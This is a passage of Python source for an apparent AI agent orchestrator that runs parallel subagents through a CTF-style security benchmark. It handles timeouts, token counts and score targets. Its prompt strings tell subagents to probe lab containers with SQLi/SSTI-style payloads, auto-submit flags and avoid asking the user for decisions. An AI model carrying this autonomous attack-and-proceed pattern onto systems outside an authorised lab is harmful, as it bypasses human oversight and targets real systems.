                    _pending_tool_calls.append({
                        "name": name, "args_str": display_args_str,
                    })
            elif event_type == AgentEventType.TOOL_RESULT:
                content = data.get("content", "")
                tool_name = data.get("tool_name", "")
                lines = content.strip().split("\n")
                _exit_code = "?"
                for _l in lines:
                    if _l.startswith("退出码:"):
                        _exit_code = _l.replace("退出码:", "").strip()
                        break
                status = _determine_status(tool_name, content, _exit_code)
                self._record_trace(
                    "tool_result",
                    detail=f"{tool_name} → {status}",
                    metadata={
                        "tool": tool_name,
                        "exit_code": _exit_code,
                        "status": status,
                        "content": content,
                    },
                )
                self._update_benchmark_runtime_state(content)
                self._benchmark_auto_submit_flags_from_tool_result(content)
                elapsed = time_mod.monotonic() - subtask_start
                if _pending_tool_calls:
                    pinfo = _pending_tool_calls.pop(0)
                    # 第一行：工具名 + 耗时 + 状态（始终在同一行）
                    renderer.console.print(
                        f"      [dim]🔧 {pinfo['name']}  ({elapsed:.0f}s)【{status}】[/]",
                        no_wrap=True,
                        overflow="ellipsis",
                    )
                    # 第二行：参数详情（如有）
                    if pinfo['args_str']:
                        renderer.console.print(
                            f"        [dim]{pinfo['name']}({pinfo['args_str']})[/]",
                            overflow="ellipsis",
                            no_wrap=True,
                        )
            elif event_type == AgentEventType.TURN_END:
                if isinstance(data, dict):
                    _token_usage["input_tokens"] += data.get("input_tokens", 0)
                    _token_usage["output_tokens"] += data.get("output_tokens", 0)

        handler.get_token_usage = lambda: dict(_token_usage)  # type: ignore[attr-defined]
        return handler

    def _run_subtask_with_escalating_timeout(
        self,
        subtask_prompt: str,
        role_label: str,
        desc: str,
    ) -> str:
        """带动态叠加超时的子任务执行。

        基础超时 300s，每次超时叠加 60s，最多叠加 3 次（最大 480s）。
        达到最大叠加次数仍未完成时，告知调用方需要重规划。
        """
        renderer = self._renderer
        base_timeout, timeout_step, max_escalations = self._subtask_timeout_config()

        def _run_once_with_runner(sub_runner: Any) -> str:
            event_handler = self._make_subtask_event_handler(renderer)
            result = sub_runner.run(
                subtask_prompt, verbose=False,
                event_handler=event_handler,
                approval_handler=self._make_subtask_approval_handler(
                    f"{role_label}\n{desc}"
                ),
            )
            usage = event_handler.get_token_usage()
            with self._usage_lock:
                self.cumulative_input_tokens += usage["input_tokens"]
                self.cumulative_output_tokens += usage["output_tokens"]
            return result

        for escalation in range(max_escalations + 1):
            timeout = base_timeout + escalation * timeout_step
            if escalation > 0:
                renderer.console.print(
                    f"    [dim yellow]↻ 第 {escalation} 次超时叠加，"
                    f"新超时={timeout}s，重试同一子任务...[/]"
                )

            sub_runner = self._create_subtask_runner()
            controller = getattr(sub_runner, "execution_controller", None)
            if controller is None:
                return _run_once_with_runner(sub_runner)

            timer_fired = threading.Event()

            def _timeout_handler():
                timer_fired.set()
                controller.request_stop(f"子任务超时（{timeout}s）")

            timer = threading.Timer(timeout, _timeout_handler)
            timer.daemon = True
            timer.start()

            try:
                result = _run_once_with_runner(sub_runner)
                if escalation > 0:
                    renderer.console.print(
                        f"    [dim green]✓ 叠加重试成功[/]"
                    )
                return result
            except ExecutionInterruptedError:
                if timer_fired.is_set():
                    # 超时导致的中断 → 判断是否还能叠加
                    if escalation < max_escalations:
                        continue  # 下一轮叠加
                    raise TimeoutError(
                        f"子任务已达最大超时叠加（{timeout}s={base_timeout}"
                        f"+{max_escalations}×{timeout_step}s），"
                        f"需重新规划此子任务。"
                    )
                raise  # 用户主动 /stop → 向上抛出
            finally:
                timer.cancel()

        # 不应到达这里，但保留兜底
        raise TimeoutError(
            f"子任务超过最大超时叠加次数（{max_escalations}），"
            f"已放弃执行。"
        )

    # ── 并行子任务支持 ──

    def _create_subtask_runner(self) -> Any:
        """创建独立的 AgentRunner 实例供并行子任务使用。

        克隆主 runner 的配置，但持有独立的 ExecutionController 和空历史，
        避免并行执行时互相影响历史记录和超时控制。
        """
        from .runner import AgentRunner

        kwargs: dict[str, Any] = {
            "tools": list(getattr(self._runner, "tools", [])),
            "mode": getattr(self._runner, "mode", None),
            "allowed_roots": list(getattr(self._runner, "allowed_roots", [])),
            "command_registry": dict(getattr(self._runner, "command_registry", {})),
            "extra_allowed_paths": list(getattr(self._runner, "extra_allowed_paths", [])),
            "configured_registry": dict(getattr(self._runner, "configured_registry", {})),
            # 独立的执行控制器——避免并行子任务互相中止
            "execution_controller": ExecutionController(),
            "capability_registry": getattr(self._runner, "capability_registry", None),
            "file_skills": list(getattr(self._runner, "file_skills", [])),
            "service_name": self._runtime_context.get("service_name", ""),
            "model_name": self._runtime_context.get("model_name", ""),
            "api_key": self._runtime_context.get("api_key", ""),
            "base_url": self._runtime_context.get("base_url"),
            "system_prompt": getattr(self._runner, "system_prompt", None),
        }
        # 仅传非 None 的可选值
        for attr in ("max_context_chars", "max_context_tokens",
                     "context_keep_recent_messages", "context_summary_max_chars"):
            val = getattr(self._runner, attr, None)
            if val is not None:
                kwargs[attr] = val
        return AgentRunner(**kwargs)

    @staticmethod
    def _build_subtask_prompt(
        role_label: str,
        desc: str,
        *,
        ctx: str = "",
        reasoning: str = "",
        aggressive: bool = False,
        benchmark_profile: str = "off",
        benchmark_state_context: str = "",
    ) -> str:
        """构建单条子任务的 prompt 文本。"""
        prompt = (
            f"你是{role_label}。"
            f"请完成以下子任务，只做这一件事，完成后给出结果摘要。\n\n"
            f"子任务: {desc}\n"
        )
        if ctx:
            prompt += f"\n上下文: {ctx}\n"
        if reasoning:
            prompt += f"\n整体背景: {reasoning[:300]}\n"
        prompt += (
            "\n请直接调用工具完成此子任务，给出核心结果。"
            "\n\n效率要求："
            "\n- 一步到位，避免分批读取——能一次读完的就不要分多次"
            "\n- 不需要用 run_shell_command 执行 # 注释来记录思路，直接在回复中说明"
            "\n- 每个工具有明确目的，不做多余的探测"
        )
        if aggressive:
            prompt += (
                "\n\n激进授权执行要求："
                "\n- 不要把已可由工具验证的事项改成询问用户；先检查文件、进程、网络、接口真实状态"
                "\n- 若已发现 VPN 配置、API 文档、token、base URL，直接基于这些信息执行当前子任务"
                "\n- Benchmark/CTF/靶场任务不要输出“请选择 A/B/C 路径”后停止；除非接口返回明确阻塞，否则继续推进标准流程"
                "\n- 需要连接 VPN、curl API、启动/关闭容器、提交 flag 时，按用户授权和文档约束执行，并报告真实结果"
                "\n- 只有遇到凭证无效、任务结束、资源持续不可用、破坏性不可逆操作或权限真实不足时，才停止请求用户决策"
            )
        if benchmark_profile == "aggressive":
            prompt += (
                "\n\nBenchmark aggressive 子任务要求："
                "\n- 本子任务必须服务于跑分收益，避免长时间低置信度发散"
                "\n- 当前工作目录固定为 /home/my/cyber/benchmark_test；禁止切换到 /home/study 或无关目录"
                "\n- 探测当前容器时必须使用运行态里记录的完整 host:port；不要把 10.x 地址改成默认 :80"
                "\n- 单题/单子任务硬预算约 90 秒；超过预算仍无 flag、无 submit、无高置信新线索时，立即 close 当前题并换下一题"
                "\n- 对当前题快速验证一个主假设和一个备选假设；同类 SQLi/SSTI/header/path payload 不要连续堆叠"
                "\n- 连续 4 个 payload 只有 Internal Server Error、404、[]、Only admins can see 等低价值响应时，停止当前方向并 close 换题"
                "\n- 发现疑似 flag 立即调用 submit；不要只把候选 flag 写在摘要里"
                "\n- 如果任意工具结果已经出现 flag{...}，下一次工具调用必须是 submit；不要再读 CHALLENGES_API.md、不要复核接口、不要继续扫描"
                "\n- submit 和 close 必须作为终止动作：一旦调用 submit 返回 correct/incorrect/duplicate，立即结束当前子任务并返回结果，禁止继续探测同一容器"
                "\n- 默认禁止调用 hint API；hint 会扣分，除非用户明确临场要求使用 hint"
                "\n- 如果当前题已经没有新线索，不要总结后继续深挖；直接调用平台 close 当前题并切换下一题"
                "\n- 对平台 API 使用已验证可达出口，对 10.x 容器使用 VPN/tun0"
            )
        if benchmark_state_context:
            prompt += f"\n\n{benchmark_state_context}"
        prompt += (
            "\n\n任务边界："
            "\n- 只围绕当前子任务、用户给出的目标、当前工作目录和明确提供的靶场地址/API 操作"
            "\n- 不要为了寻找线索去读取 cyber-agent 本地源码、历史会话、桌面端代码、.env 或凭证配置"
            "\n- 不要对 /home、/ 或无关目录做大范围 find/grep/cat"
            "\n- 如果明确 API/目标连续失败，停止并报告失败原因和所需信息，不要转向无关本地项目排查"
        )
        return prompt

    def _run_parallel_batch(
        self,
        batch: list[dict],
        *,
        user_input: str,
        reasoning: str,
        additional_context: str,
    ) -> list[str]:
        """并发执行一批标记为 parallel 的子任务。

        每个子任务使用独立的 AgentRunner 实例，通过 ThreadPoolExecutor
        并发执行。全部完成后统一收集结果并按原始顺序返回。
        """
        renderer = self._renderer
        n = len(batch)
        renderer.console.print(
            f"  [dim]── ⚡ 并行执行 {n} 个子任务 ...[/]"
        )
        self._record_trace("parallel_batch_start", detail=f"{n} 个子任务")

        max_workers = min(n, self._resolve_max_subagents())
        self._record_trace(
            "parallel_batch_scheduled",
            detail=f"{n} 个子任务，max_workers={max_workers}",
            metadata={
                "batch_size": n,
                "max_workers": max_workers,
                "strategy": self._resolve_subtask_concurrency(),
                "resource_keys": [
                    sorted(self._extract_subtask_resource_keys(task))
                    for task in batch
                ],
            },
        )

        def _run_one(seq: int, task: dict) -> dict:
            role_str = task.get("role", "runner")
            desc = task.get("task_description", str(task))
            ctx = task.get("context", "")
            if additional_context:
                ctx = f"{ctx}\n补充: {additional_context}" if ctx else additional_context
            role_label = get_role_label(self._str_to_role(role_str))

            subtask_prompt = self._build_subtask_prompt(
                role_label,
                desc,
                ctx=ctx,
                reasoning=reasoning,
                aggressive=self._is_aggressive_execution(),
                benchmark_profile=self._resolve_benchmark_profile(),
                benchmark_state_context=self._benchmark_state_context(),
            )
            sub_runner = self._create_subtask_runner()
            sub_renderer = renderer

            try:
                event_handler = self._make_subtask_event_handler(sub_renderer)
                sub_start = time_mod.monotonic()
                result = sub_runner.run(
                    subtask_prompt,
                    verbose=False,
                    event_handler=event_handler,
                    approval_handler=self._make_subtask_approval_handler(
                        f"{role_str}\n{desc}\n{ctx}"
                    ),
                )
                # 收集并行子任务的 Token 用量（注意线程安全：每子任务独立 handler）
                usage = event_handler.get_token_usage()
                with self._usage_lock:
                    self.cumulative_input_tokens += usage["input_tokens"]
                    self.cumulative_output_tokens += usage["output_tokens"]
                elapsed = (time_mod.monotonic() - sub_start) * 1000
                self._record_trace(
                    "parallel_subtask_complete",
                    detail=f"[{role_str}] {desc[:200]} ({elapsed:.0f}ms)",
                )
                return {
                    "seq": seq,
                    "task_index": task.get("_task_index", seq),
                    "role": role_str,
                    "desc": desc,
                    "result": result,
                    "elapsed_ms": elapsed,
                    "error": None,
                }
            except Exception as exc:
                self._record_trace(
                    "parallel_subtask_error",
                    detail=f"[{role_str}] {desc[:100]}: {exc}",
                )
                return {
                    "seq": seq,
                    "task_index": task.get("_task_index", seq),
                    "role": role_str,
                    "desc": desc,
                    "result": "",
                    "elapsed_ms": 0,
                    "error": str(exc),
                }

        results: list[dict] = []
        with concurrent.futures.ThreadPoolExecutor(max_workers=max_workers) as pool:
            futures = {
                pool.submit(_run_one, seq, task): seq
                for seq, task in enumerate(batch)
            }
            for future in concurrent.futures.as_completed(futures):
                try:
                    results.append(future.result())
                except Exception as exc:
                    seq = futures[future]
                    results.append({
                        "seq": seq,
                        "task_index": batch[seq].get("_task_index", seq),
                        "role": batch[seq].get("role", "runner"),
                        "desc": batch[seq].get("task_description", str(batch[seq])),
                        "result": "",
                        "elapsed_ms": 0,
                        "error": str(exc),
                    })

        # 按原始顺序排序后输出
        results.sort(key=lambda r: r["seq"])
        out: list[str] = []
        for r in results:
            task_index = int(r.get("task_index", r["seq"]))
            if r["error"]:
                renderer.console.print(
                    f"    [dim red]✗ [{r['role']}] {r['desc'][:60]}... "
                    f"({r['elapsed_ms']:.0f}ms) 失败: {r['error']}[/]"
                )
                self._print_subtask_status(
                    task_index,
                    str(r["role"]),
                    str(r["desc"]),
                    "fail",
                    detail=str(r["error"])[:80],
                    parallel=True,
                )
                out.append(f"## [{r['role']}] {r['desc']}\n❌ 失败: {r['error']}")
                self._consecutive_failures += 1
            else:
                renderer.console.print(
                    f"    [dim green]✓ [{r['role']}] {r['desc'][:60]}... "
                    f"({r['elapsed_ms']:.0f}ms, {len(r['result'])}字)[/]"
                )
                self._print_subtask_status(
                    task_index,
                    str(r["role"]),
                    str(r["desc"]),
                    "done",
                    detail=f"{r['elapsed_ms']:.0f}ms, {len(r['result'])}字",
                    parallel=True,
                )
                out.append(f"## [{r['role']}] {r['desc']}\n{r['result']}")
                self._consecutive_failures = 0

        self._record_trace("parallel_batch_end", detail=f"{n} 个子任务完成")
        return out

    def _call_role_with_timeout(
        self,
        role: AgentRole,
        user_input: str,
        *,
        context: str = "",
        extra_instruction: str = "",
        timeout: float = LLM_CALL_TIMEOUT_SECONDS,
    ) -> str:
        """带超时的角色 LLM 调用。在线程池中执行，超时则返回错误标记。"""
        renderer = self._renderer

        def _invoke():
            return self._call_role(
                role, user_input,
                context=context,
                extra_instruction=extra_instruction,
            )

        try:
            with concurrent.futures.ThreadPoolExecutor(max_workers=1) as executor:
                future = executor.submit(_invoke)
                return future.result(timeout=timeout)
        except concurrent.futures.TimeoutError:
            label = get_role_label(role)
            renderer.console.print(
                f"  [red]✗ {label} 超时[/] [dim]({timeout}s 未响应)[/]"
            )
            return f"[{label} 调用超时: {timeout}s 内未返回]"
        except Exception as exc:
            label = get_role_label(role)
            renderer.console.print(
                f"  [red]✗ {label} 异常[/] [dim]({exc})[/]"
            )
            return f"[{label} 异常: {exc}]"

    def _track_llm_usage(self, response: Any) -> None:
        """从 LLM 响应中提取并累计 token 使用量。"""
        from .runner import _extract_usage_from_chunk, _estimate_tokens_from_text
        usage = _extract_usage_from_chunk(response)
        if usage is None:
            usage = {
                "input_tokens": 0,
                "output_tokens": _estimate_tokens_from_text(self._extract_text(response)),
                "total_tokens": _estimate_tokens_from_text(self._extract_text(response)),
            }
        with self._usage_lock:
            self.cumulative_input_tokens += usage["input_tokens"]
            self.cumulative_output_tokens += usage["output_tokens"]

    def get_usage_summary(self) -> dict[str, int]:
        """返回累计 token 使用量。"""
        return {
            "input_tokens": self.cumulative_input_tokens,
            "output_tokens": self.cumulative_output_tokens,
            "total_tokens": self.cumulative_input_tokens + self.cumulative_output_tokens,
        }

    def _resolve_execution_profile(self) -> str:
        configured = str(
            self._runtime_context.get(
                "resolved_execution_profile",
                self._runtime_context.get("execution_profile", "auto"),
            )
        ).strip().lower()
        if configured in {"conservative", "aggressive"}:
            return configured
        mode = self._runtime_context.get("mode")
        mode_value = getattr(mode, "value", str(mode))
        approval_policy = self._runtime_context.get("approval_policy")
        approval_value = getattr(approval_policy, "value", str(approval_policy))
        has_root = False
        for key in ("allowed_roots", "extra_allowed_paths"):
            value = self._runtime_context.get(key)
            if isinstance(value, list):
                for raw_path in value:
                    try:
                        if Path(raw_path).expanduser().resolve() == Path("/"):
                            has_root = True
                            break
                    except (OSError, TypeError, ValueError):
                        continue
            if has_root:
                break
        if (
            mode_value == "authorized"
            and approval_value == "auto"
            and bool(self._runtime_context.get("auto_decision", False))
            and has_root
        ):
            return "aggressive"
        return "conservative"

    def _is_aggressive_execution(self) -> bool:
        return self._resolve_execution_profile() == "aggressive"

    @staticmethod
    def _looks_like_benchmark_task(text: str) -> bool:
        lowered = text.lower()
        markers = (
            "tsec benchmark",
            "tsecbench",
            "benchmark_token",
            "/openapi/v1/challenges",
            "correct_flag_count",
            "unique_code",
            "xben-",
            "跑分",
        )
        return any(marker in lowered for marker in markers)

    def _resolve_benchmark_profile(self) -> str:
        configured = str(
            self._runtime_context.get("benchmark_profile", "off")
        ).strip().lower()
        if configured == "aggressive":
            return "aggressive"
        if configured == "auto" and self._benchmark_profile_active:
            return "aggressive"
        return "off"

    def _is_benchmark_aggressive(self) -> bool:
        return self._resolve_benchmark_profile() == "aggressive"

    def _resolve_benchmark_target_score(self) -> int:
        raw_value = self._runtime_context.get("benchmark_target_score", 0)
        try:
            value = int(raw_value)
        except (TypeError, ValueError):
            return 0
        return max(0, value)

    def _resolve_effective_max_iterations(self) -> int:
        configured = self._resolve_max_iterations()
        if not self._is_benchmark_aggressive():
            return configured
        target_score = self._resolve_benchmark_target_score()
        if target_score <= 0:
            return configured
        estimate = max(1, self._benchmark_estimated_fast_score())
        estimated_challenges = max(1, (target_score + estimate - 1) // estimate)
        return min(100, max(configured, estimated_challenges + 5))

    def _subtask_timeout_config(self) -> tuple[int, int, int]:
        if self._is_benchmark_aggressive():
            return (
                BENCHMARK_SUBTASK_TIMEOUT,
                TIMEOUT_ESCALATION_STEP,
                BENCHMARK_TIMEOUT_ESCALATIONS,
            )
        return (
            BASE_SUBTASK_TIMEOUT,
            TIMEOUT_ESCALATION_STEP,
            MAX_TIMEOUT_ESCALATIONS,
        )

    def _benchmark_score_status(self) -> dict[str, Any]:
        state = self._benchmark_state_snapshot()
        scores = state.get("completed_scores") or {}
        known_score = sum(score for score in scores.values() if isinstance(score, int))
        target_score = self._resolve_benchmark_target_score()
        remaining = max(0, target_score - known_score) if target_score > 0 else 0
        return {
            "target_score": target_score,
            "known_score": known_score,
            "remaining": remaining,
            "target_reached": target_score > 0 and known_score >= target_score,
            "gap_mode": target_score > 0 and 0 < remaining <= 200,
            "rush_mode": (
                target_score > 0
                and 200 < remaining <= BENCHMARK_RUSH_REMAINING_THRESHOLD
            ),
            "task_finished": bool(state.get("task_finished")),
            "completed_count": len(state.get("completed_challenges") or []),
            "current_challenge": state.get("current_challenge"),
        }

    def _benchmark_target_continue_directive(self) -> str:
        if not self._is_benchmark_aggressive():
            return ""
        status = self._benchmark_score_status()
        target_score = int(status.get("target_score") or 0)
        if bool(status.get("target_reached")):
            return ""
        known_score = int(status.get("known_score") or 0)
        if target_score <= 0:
            fast_label = self._benchmark_policy_difficulty_label("fast_path_difficulties")
            handoff_label = self._benchmark_policy_difficulty_label("handoff_difficulties")
            return (
                "Benchmark maximize gate：当前为正式测评/无固定目标分模式，"
                f"已知得分 {known_score}。平台尚未返回 finished/invalid_state，"
                "不能判定执行完成。下一轮必须继续刷新题目列表，优先处理"
                "未完成/stopped；"
                f"{fast_label} 题用 deterministic/adaptive fast path，"
                f"{handoff_label} 交给四柱思考、决策者、思考者、审计者、反思者。"
                "如果当前题无明确突破，先 close 当前题再 start 下一题。"
            )
        remaining = int(status.get("remaining") or 0)
        mode_line = ""
        if status.get("gap_mode"):
            mode_line = (
                "当前进入 gap mode：距离目标只差不超过一道题满分，"
                "不要深挖单题完整解；优先部分 flag、候选 secret、"
                "任意 awarded > 0 的提交快速补齐差额；默认仍禁止 hint 扣分。"
            )
        elif status.get("rush_mode"):
            mode_line = (
                "当前进入 rush mode：距离目标已不超过 "
                f"{BENCHMARK_RUSH_REMAINING_THRESHOLD} 分。"
                "任何工具输出里一旦出现 flag{...}、secret 或候选答案，"
                "下一次工具调用必须直接 POST /openapi/v1/challenges/submit；"
                "禁止先读文档、复核接口、继续目录扫描或追加同类 payload。"
            )
        return (
            "Benchmark target gate：当前已知得分 "
            f"{known_score}/{target_score}，距离目标还差 {remaining}。"
            "平台尚未返回 finished/invalid_state，不能判定执行完成。"
            f"{mode_line}"
            "下一轮必须继续刷新题目列表，选择下一道未完成/stopped 题；"
            "如果当前题无明确突破，先 close 当前题再 start 下一题。"
        )

    def _benchmark_timeout_directive(self, reason: str) -> str:
        if not self._is_benchmark_aggressive():
            return ""
        with self._benchmark_state_lock:
            current = (
                self._benchmark_state.get("current_challenge")
                or self._benchmark_current_challenge
            )
            if not isinstance(current, str) or not current:
                return ""
            reasoning = set(self._benchmark_state.get("reasoning_challenges", set()))
            if current in reasoning:
                self._record_trace(
                    "benchmark_timeout_suppressed",
                    detail=(
                        f"{current} 已有有效响应线索，子任务超时不自动 close；"
                        "下一轮应收窄探测范围继续深挖。"
                    ),
                    metadata={
                        "challenge": current,
                        "reason": reason,
                        "score_status": self._benchmark_score_status(),
                    },
                )
                return ""
            abandoned = set(self._benchmark_state.get("abandoned_challenges", set()))
            abandoned.add(current)
            self._benchmark_state["abandoned_challenges"] = abandoned
        directive = (
            f"Benchmark timeout gate 已触发：当前题 {current} 的子任务超时。"
            f"原因：{reason}。"
            "下一轮必须先调用平台 close?unique_code="
            f"{current} 释放容器，然后刷新题目列表，选择下一道未完成/stopped 题。"
            "不要重规划继续深挖当前题，也不要继续对当前 10.x 容器发 payload。"
        )
        self._record_trace(
            "benchmark_timeout_detected",
            detail=directive,
            metadata={
                "challenge": current,
                "reason": reason,
                "score_status": self._benchmark_score_status(),
                "action": "close_and_switch",
            },
        )
        self._persist_benchmark_state()
        return directive

    def _benchmark_setup_timeout_stop_reason(self, reason: str) -> str:
        if not self._is_benchmark_aggressive():
            return ""
        with self._benchmark_state_lock:
            current = (
                self._benchmark_state.get("current_challenge")
                or self._benchmark_current_challenge
            )
            if isinstance(current, str) and current:
                return ""
            streak = int(self._benchmark_state.get("setup_timeout_streak") or 0) + 1
            self._benchmark_state["setup_timeout_streak"] = streak
        self._record_trace(
            "benchmark_setup_timeout",
            detail=f"setup_timeout_streak={streak}: {reason}",
            metadata={
                "setup_timeout_streak": streak,
                "limit": BENCHMARK_SETUP_TIMEOUT_STREAK_LIMIT,
                "reason": reason,
            },
        )
        self._persist_benchmark_state()
        if streak < BENCHMARK_SETUP_TIMEOUT_STREAK_LIMIT:
            return ""
        return (
            "Benchmark aggressive 连续 "
            f"{streak} 次在未锁定当前题前超时，平台 API、VPN 或模型工具调用"
            "可能不可用；停止本轮管线，避免空耗 token。"
        )

    def _benchmark_reset_setup_timeout_streak(self) -> None:
        if not self._is_benchmark_aggressive():
            return
        with self._benchmark_state_lock:
            if not self._benchmark_state.get("setup_timeout_streak"):
                return
            self._benchmark_state["setup_timeout_streak"] = 0
        self._record_trace(
            "benchmark_setup_timeout_reset",
            detail="Benchmark 前置阶段已有成功子任务，setup timeout streak 已清零。",
        )
        self._persist_benchmark_state()

    @staticmethod
    def _is_transient_llm_error(text: str) -> bool:
        lowered = text.lower()
        return any(
            marker in lowered
            for marker in (
                "429",
                "rate limit",
                "ratelimit",
                "freeusagelimiterror",
                "connection error",
                "apiconnectionerror",
                "api connection error",
                "connection aborted",
                "connection reset",
                "connection timed out",
                "service temporarily unavailable",
                "temporarily unavailable",
                "error code: 503",
                "try again later",
            )
        )

    def _resolve_benchmark_rate_limit_backoff_seconds(self) -> float:
        raw_value = self._runtime_context.get("benchmark_rate_limit_backoff_seconds", 60)
        try:
            value = float(raw_value)
        except (TypeError, ValueError):
            value = 60.0
        return max(0.0, min(value, 300.0))

    def _benchmark_rate_limit_backoff(self, reason: str, text: str) -> bool:
        if not self._is_benchmark_aggressive() or not self._is_transient_llm_error(text):
            return False
        seconds = self._resolve_benchmark_rate_limit_backoff_seconds()
        self._consecutive_failures = 0
        detail = (
            f"Benchmark target gate 遇到临时 LLM/API 异常：{reason}；"
            f"等待 {seconds:g}s 后继续，不结束未达标任务。"
        )
        self._record_trace(
            "benchmark_rate_limit_backoff",
            detail=detail,
            metadata={
                "reason": reason,
                "seconds": seconds,
                "score_status": self._benchmark_score_status(),
            },
        )
        self._renderer.console.print(f"  [dim yellow]{detail}[/]")
        if seconds > 0:
            time_mod.sleep(seconds)
        return True

    def _benchmark_should_continue_iteration_batches(
        self,
        *,
        source: str,
        completed_iterations: int,
    ) -> bool:
        """Decide whether Benchmark should automatically start another loop batch."""
        if not self._is_benchmark_aggressive():
            return False
        if self._benchmark_stop_if_terminal(f"{source}_batch_boundary"):
            return False
        status = self._benchmark_score_status()
        if status.get("target_reached"):
            return False
        target_score = int(status.get("target_score") or 0)

        batch_count = int(
            self._runtime_context.get("_benchmark_iteration_batch_count", 1) or 1
        )
        if batch_count >= BENCHMARK_MAX_ITERATION_BATCHES:
            self._record_trace(
                "benchmark_iteration_batch_stop",
                detail=(
                    f"已自动续跑 {batch_count} 批、{completed_iterations} 轮，"
                    "达到安全上限；停止以避免无限空转。"
                ),
                metadata=status,
            )
            return False

        self._renderer.console.print(
            "  [dim]⏳ 反思者 正在做 Benchmark 批次续跑判断...[/]"
        )
        review = self._call_role_with_timeout(
            AgentRole.REFLECTOR,
            "TSec Benchmark 批次边界续跑判断",
            context=(
                "## Benchmark 批次状态\n"
                f"{json.dumps(status, ensure_ascii=False)}\n\n"
                f"已完成轮次: {completed_iterations}\n"
                f"来源: {source}"
            ),
            extra_instruction=(
                "请只判断是否需要自动启动下一批轮次。"
                "如果平台 finished/invalid_state，第一行写「停止」。"
                "如果存在固定目标分且已达到目标分，第一行写「停止」。"
                "如果无固定目标分或目标未达成，且平台未 finished，第一行写「继续」，"
                "并用一句话说明下一批应优先 close/list/start 还是继续当前题。"
            ),
        )
        self._record_trace(
            "benchmark_iteration_batch_reflection",
            detail=review[:500],
            metadata={
                **status,
                "source": source,
                "completed_iterations": completed_iterations,
            },
        )
        if self._is_transient_llm_error(review):
            self._benchmark_rate_limit_backoff("benchmark_batch_reflection", review)

        directive = self._benchmark_target_continue_directive()
        if directive:
            self._benchmark_forced_directive = directive
        self._runtime_context["_benchmark_iteration_batch_count"] = batch_count + 1
        self._record_trace(
            "benchmark_iteration_batch_continue",
            detail=(
                f"{source} 第 {batch_count} 批结束但仍需继续，"
                f"已知得分 {status.get('known_score')}"
                + (f"/{target_score}" if target_score > 0 else "（maximize mode）")
                + "；"
                "自动启动下一批轮次。"
            ),
            metadata={
                **status,
                "source": source,
                "completed_iterations": completed_iterations,
                "next_batch": batch_count + 1,
            },
        )
        if target_score > 0:
            self._renderer.console.print(
                "  [dim yellow]Benchmark 批次续跑判断：目标未达成，"
                f"自动启动第 {batch_count + 1} 批轮次。[/]"
            )
        else:
            self._renderer.console.print(
                "  [dim yellow]Benchmark 批次续跑判断：maximize mode 未结束，"
                f"自动启动第 {batch_count + 1} 批轮次。[/]"
            )
        return True

    def _benchmark_fallback_subtasks(self) -> list[dict[str, Any]]:
        state_context = self._benchmark_state_context()
        state = self._benchmark_state_snapshot()
        current = state.get("current_challenge")
        policy = self._benchmark_selection_policy()
        difficulty_order = " > ".join(policy["difficulty_order"])
        fast_difficulties = ", ".join(policy["fast_path_difficulties"])
        subtasks: list[dict[str, Any]] = []
        if isinstance(current, str) and current:
            subtasks.append(
                {
                    "role": "runner",
                    "task_description": (
                        f"Benchmark fallback step 1：如果 {current} 仍未关闭，"
                        f"只调用平台 close?unique_code={current} 释放容器；"
                        "不要探测容器，不要做其他动作。"
                    ),
                    "context": state_context,
                    "parallel": False,
                }
            )
        subtasks.extend(
            [
                {
                    "role": "runner",
                    "task_description": (
                        "Benchmark fallback step 2：只刷新 /openapi/v1/challenges，"
                        "按未完成、未关闭、未放弃、stopped 选择下一题；"
                        f"排序策略来自 selection_policy（当前 {difficulty_order}）；"
                        f"{fast_difficulties} 可走 fast path，其余交给四柱，"
                        "输出 unique_code；禁止调用 hint。"
                    ),
                    "context": state_context,
                    "parallel": False,
                },
                {
                    "role": "runner",
                    "task_description": (
                        "Benchmark fallback step 3：只 start 上一步选中的题，记录 "
                        "unique_code 和 container_addr；不要探测，不要 submit。"
                    ),
                    "context": state_context,
                    "parallel": False,
                },
                {
                    "role": "runner",
                    "task_description": (
                        "Benchmark fallback step 4：对当前 10.x 容器做 60 秒快速指纹："
                        "必须使用状态中记录的精确 host:port，不要猜测 :80；"
                        "根路径、headers、robots、openapi/docs、静态资源、源码注释、"
                        "默认凭证；只汇报最高置信攻击路径。"
                    ),
                    "context": state_context,
                    "parallel": False,
                },
                {
                    "role": "runner",
                    "task_description": (
                        "Benchmark fallback step 5：基于指纹只尝试一个主攻击假设"
                        "和一个备选假设。发现 flag/secret/候选答案立即 submit；"
                        "一旦 submit 返回 correct/incorrect/duplicate 就立刻结束子任务，"
                        "禁止继续探测同一容器。"
                    ),
                    "context": state_context,
                    "parallel": False,
                },
                {
                    "role": "runner",
                    "task_description": (
                        "Benchmark fallback step 6：如果当前题已提交成功、无快速突破"
                        "或已 stale，只调用平台 close 当前 unique_code，然后返回 close 结果。"
                    ),
                    "context": state_context,
                    "parallel": False,
                },
            ]
        )
        return subtasks

    def _benchmark_fast_cycle_subtasks(self) -> list[dict[str, Any]]:
        """Return the minimal policy-driven loop used by Benchmark aggressive fast path."""
        state_context = self._benchmark_state_context()
        state = self._benchmark_state_snapshot()
        policy = self._benchmark_selection_policy()
        difficulty_order = " > ".join(policy["difficulty_order"])
        fast_difficulties = ", ".join(policy["fast_path_difficulties"])
        retry_limit = policy["unreachable_retries"]
        subtasks: list[dict[str, Any]] = []
        if not state.get("vpn_connected") or not state.get("api_interface"):
            subtasks.append(
                {
                    "role": "runner",
                    "task_description": (
                        "Benchmark fast setup：只做前置校验。读取当前目录 "
                        "CHALLENGES_API.md 和 .ovpn；若 tun0 已存在则复用，"
                        "否则启动 OpenVPN；确定平台 API 物理网卡并用 BENCHMARK_TOKEN "
                        "GET /openapi/v1/challenges 校验可达。不要 start、submit、hint。"
                    ),
                    "context": state_context,
                    "parallel": False,
                }
            )
        subtasks.extend([
            {
                "role": "runner",
                "task_description": (
                    "Benchmark fast step 1：只做调度。必要时先 close 当前 stale/已放弃题；"
                    "然后 GET /openapi/v1/challenges，以平台真实 is_completed/container_status "
                    "为准筛选未完成 stopped 的下一题并 POST start；"
                    f"排序策略来自 selection_policy（当前 {difficulty_order}），"
                    f"fast path 难度为 {fast_difficulties}；本地 closed/abandoned "
                    "只作为软跳过且可按策略恢复一次；只记录 unique_code 和 container_addr，不探测、不 submit、"
                    "不 hint。"
                ),
                "context": state_context,
                "parallel": False,
            },
            {
                "role": "runner",
                "task_description": (
                    "Benchmark fast step 2：只解当前已启动的 10.x 容器。45 秒快速指纹"
                    "时必须使用状态中记录的精确 host:port，不要猜测 :80；"
